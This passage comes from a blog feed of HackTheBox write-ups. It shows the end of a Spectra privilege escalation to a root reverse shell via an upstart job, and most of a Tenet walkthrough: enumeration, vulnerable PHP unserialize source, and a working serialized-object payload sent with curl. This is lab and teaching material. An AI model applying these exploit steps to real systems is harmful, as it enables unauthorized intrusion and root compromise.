</code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ scp exploit.conf katie@10.10.10.229:/dev/shm
Password:
bash: warning: /home/katie/.bashrc: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
exploit.conf                               100%  <span style="color:#ae81ff">775</span>    13.1KB/s   00:00
</code></pre></div><p>I&rsquo;ll use the following command and setup a <code>nc</code> listener on my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 <span style="color:#f92672">&amp;&amp;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span style="color:#f92672">&amp;&amp;</span> sudo /sbin/initctl start test5
</code></pre></div><p>If I check on my listener, I have a root shell now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35486</span>
whoami
root
id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210627002203606.png" alt="image-20210627002203606"  />
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
<li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Tenet</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</link>
      <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</guid>
      <description>Tenet is a medium difficulty Linux machine from Hack The Box. It features PHP deserialization vulnerability, which can be leveraged to gain a foothold. Enumerating the web configuration files finds a set of database credentials, and they are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</description>
      <content:encoded><![CDATA[<p>Tenet is a medium difficulty Linux machine from Hack The Box. It features PHP deserialization vulnerability, which can be leveraged to gain a foothold. Enumerating the web configuration files finds a set of database credentials, and they are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>PHP deserialization attack</li>
<li>Race-condition</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>PHP</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full scan on Tenet discovers only two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 10.10.10.223 | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «192.168.43.234» 
$ nmap -sC -sV -p$ports -oA scans/full-tenet 10.10.10.223
<span style="color:#75715e"># Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.223
Host is up <span style="color:#f92672">(</span>0.059s latency<span style="color:#f92672">)</span>.
Scanned at 2021-03-16 23:32:46 EDT <span style="color:#66d9ef">for</span> 17s

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
|   <span style="color:#ae81ff">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS
|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span>
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p><code>nmap</code> already identified that this site shows the default page of Apache web server.</p>
<p><img class="img-container" src="imgs/image-20210614165913959.png" alt="image-20210614165913959"  />
</p>
<h4 id="gobuster">Gobuster</h4>
<p>Running <code>gobuster</code> against the site reveals that there is a WordPress site.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.223/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   403,404
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,php,bak
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/06/14 06:08:53 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10918<span style="color:#f92672">]</span>
/users.txt            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7<span style="color:#f92672">]</span>    
/wordpress            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 316<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.223/wordpress/<span style="color:#f92672">]</span>
                                                                                    
<span style="color:#f92672">===============================================================</span>
2021/06/14 06:11:20 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Poking <code>/users.txt</code> returns a text &ldquo;Success&rdquo;, I don&rsquo;t know what&rsquo;s that means.</p>
<p><img class="img-container" src="imgs/image-20210614171354046.png" alt="image-20210614171354046"  />
</p>
<h4 id="wordpress">/wordpress</h4>
<p>Somehow on <code>/wordpress</code>,  the site looks broken.</p>
<p><img class="img-container" src="imgs/image-20210614171926106.png" alt="image-20210614171926106"  />
</p>
<p>It turns out there is a hostname.</p>
<p><img class="img-container" src="imgs/image-20210614172030551.png" alt="image-20210614172030551"  />
</p>
<p>I&rsquo;ll add tenet.htb to my <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ echo <span style="color:#e6db74">&#39;tenet.htb 10.10.10.223&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Poking <code>curl</code> shows that this port has different contents when we visit it with a hostname.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223 | wc -c
<span style="color:#ae81ff">10918</span>
→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://tenet.htb | wc -c 
<span style="color:#ae81ff">10581</span>
</code></pre></div><p>From here, I&rsquo;ll separate the enumeration on new section.</p>
<h3 id="tcp-80---tenethtb">TCP 80 - tenet.htb</h3>
<p>Probably <code>http://10.10.10.223/wordpress/</code> is redirected to <code>tenet.htb</code> by the web server.</p>
<p><img class="img-container" src="imgs/image-20210614173225299.png" alt="image-20210614173225299"  />
</p>
<p>There is one post titled with &ldquo;Migrations&rdquo; states that they&rsquo;re currently migrating the data from a flat file.</p>
<p><img class="img-container" src="imgs/image-20210614173704577.png" alt="image-20210614173704577"  />
</p>
<blockquote>
<p>/etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.</p>
</blockquote>
<p>At the bottom, there is one user commented on the migration post which is probably the hint.</p>
<p><img class="img-container" src="imgs/image-20210614174052879.png" alt="image-20210614174052879"  />
</p>
<p>I&rsquo;ll note that &ldquo;sator php&rdquo; file and also a backup of that file.</p>
<h4 id="wpscan">WPScan</h4>
<p>I ran a <code>wpscan</code>  to find some database backup or something related with that, but I didn&rsquo;t find anything except usernames.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15                                                          
_______________________________________________________________
         __          _______   _____
         <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
          <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
           <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#960050;background-color:#1e0010">&#39;</span>_ <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#ae81ff">\ </span> /<span style="color:#ae81ff">\ </span> /  | |     ____<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>__| <span style="color:#f92672">(</span>_| | | | |
             <span style="color:#ae81ff">\/</span>  <span style="color:#ae81ff">\/</span>   |_|    |_____/ <span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> protagonist
 | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
 | Confirmed By:
 |  Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
 |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 |   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> neil
 | Found By: Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
 | Confirmed By: Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
</code></pre></div><h4 id="directory-brute-force-guessing">Directory brute-force (Guessing)</h4>
<p>I tried to guess the location of sator php files with <code>curl</code> but it returned with 404.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ <span style="color:#66d9ef">for</span> i in sator.php sator.php.bak; <span style="color:#66d9ef">do</span> curl -sIL http://tenet.htb/$i; <span style="color:#66d9ef">done</span>
HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 10:51:50 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1

HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 10:51:51 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
</code></pre></div><h3 id="vhost-enumeration">Vhost enumeration</h3>
<p>Next, I&rsquo;ll try to enumerate vhost, but first I&rsquo;ll use <code>cewl</code> to generate a custom wordlist. Because &ldquo;sator&rdquo; and &ldquo;backup&rdquo; are consists of 5 characters, I&rsquo;ll set the minimum word length to 5.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ cewl -m <span style="color:#ae81ff">5</span> -w wordlist-vhost http://tenet.htb
CeWL 5.4.6 <span style="color:#f92672">(</span>Exclusion<span style="color:#f92672">)</span> Robin Wood <span style="color:#f92672">(</span>robin@digi.ninja<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>https://digi.ninja/<span style="color:#f92672">)</span>
</code></pre></div><p>I tried the wordlist with <code>ffuf</code>, but didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span style="color:#e6db74">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span style="color:#ae81ff">200</span> -fl <span style="color:#ae81ff">376</span>

        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       

       v1.3.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.223
 :: Wordlist         : FUZZ: wordlist-vhost
 :: Header           : Host: FUZZ.tenet.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : <span style="color:#ae81ff">10</span>
 :: Threads          : <span style="color:#ae81ff">40</span>
 :: Matcher          : Response status: <span style="color:#ae81ff">200</span>
 :: Filter           : Response lines: <span style="color:#ae81ff">376</span>
________________________________________________

:: Progress: <span style="color:#f92672">[</span>93/93<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">11</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:05<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</code></pre></div><h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
<p>I found the files that user Neil was talking about at  <code>http://10.10.10.223/[here]</code>, without the hostname:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ <span style="color:#66d9ef">for</span> i in sator.php sator.php.bak; <span style="color:#66d9ef">do</span> curl -sIL http://10.10.10.223/$i; <span style="color:#66d9ef">done</span>
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 11:21:04 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8

HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 11:21:05 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Last-Modified: Thu, <span style="color:#ae81ff">17</span> Dec <span style="color:#ae81ff">2020</span> 09:52:50 GMT
ETag: <span style="color:#e6db74">&#34;202-5b6a5f47911e4&#34;</span>
Accept-Ranges: bytes
Content-Length: <span style="color:#ae81ff">514</span>
Content-Type: application/x-trash
</code></pre></div><p>Another guessing, I think the keyword is &ldquo;Migration&rdquo;, so probably before moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
<p>Poking <code>Sator.php</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223/sator.php
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Grabbing users from text file &lt;br&gt;
<span style="color:#f92672">[]</span> Database updated &lt;br&gt;
</code></pre></div><p>Poking <code>sator.php.bak</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223/sator.php.bak
&lt;?php

class DatabaseExport
<span style="color:#f92672">{</span>
        public $user_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;users.txt&#39;</span>;
        public $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;

        public <span style="color:#66d9ef">function</span> update_db<span style="color:#f92672">()</span>
        <span style="color:#f92672">{</span>
                echo <span style="color:#e6db74">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span>;
                $this-&gt; data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Success&#39;</span>;
        <span style="color:#f92672">}</span>


        public <span style="color:#66d9ef">function</span> __destruct<span style="color:#f92672">()</span>
        <span style="color:#f92672">{</span>
                file_put_contents<span style="color:#f92672">(</span>__DIR__ . <span style="color:#e6db74">&#39;/&#39;</span> . $this -&gt;user_file, $this-&gt;data<span style="color:#f92672">)</span>;
                echo <span style="color:#e6db74">&#39;[] Database updated &lt;br&gt;&#39;</span>;
        //      echo <span style="color:#e6db74">&#39;Gotta get this working properly...&#39;</span>;
        <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>

$input <span style="color:#f92672">=</span> $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;arepo&#39;</span><span style="color:#f92672">]</span> ?? <span style="color:#e6db74">&#39;&#39;</span>;
$databaseupdate <span style="color:#f92672">=</span> unserialize<span style="color:#f92672">(</span>$input<span style="color:#f92672">)</span>;

$app <span style="color:#f92672">=</span> new DatabaseExport;
$app -&gt; update_db<span style="color:#f92672">()</span>;


?&gt;
</code></pre></div><h3 id="source-code-analysis">Source Code Analysis</h3>
<h4 id="deserialization-vulnerability">Deserialization vulnerability</h4>
<p>First, from the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but from what I know is the function will be called when there is no more references to an object (comment by me):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>;
$app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update_db</span>(); 
<span style="color:#75715e">// __destruct is called afterwards
</span><span style="color:#75715e">// [] Database updated will be printed out
</span></code></pre></div><p>Here&rsquo;s an example:</p>
<p><img class="img-container" src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  />
</p>
<p>Second, the user-controlled input with parameter <code>arepo</code> is directly passed to <code>unserialize()</code> function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
<p>Since <code>unserialize</code> is called before the creation of object (<code>$app</code>), I&rsquo;ll use the opposite magic function called <code>__construct()</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">...&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;...</span>
$input <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;arepo&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
$databaseupdate <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($input);

$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>;
$app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update_db</span>();
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="object-injectiondeserialization-poc">Object Injection/Deserialization PoC</h4>
<p>First, I&rsquo;ll just do some testing with this script below and save it to a file called <code>tenetization.php</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
{
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
        {
        		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test.php&#39;</span>;
                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>;
        }
}
$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>I use URL encode there because I&rsquo;m going to use <code>curl</code> to interact with the site.</p>
<p>I&rsquo;ll run that script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ php tenetization.php
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D
</code></pre></div><p>If I don&rsquo;t have PHP. I could use <a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler">this site</a> to get output of my PHP script.</p>
<p>I&rsquo;ll send that output to <code>sator.php</code> via <code>curl</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ curl -sI <span style="color:#e6db74">&#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D&#34;</span>
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 12:43:43 GMT
Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
</code></pre></div><p>And that works!</p>
<p><img class="img-container" src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  />
</p>
<p>Based on 0xdf&rsquo;s awesome <a href="https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#create-serialized-object">writeup</a>,  this payload would also works:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
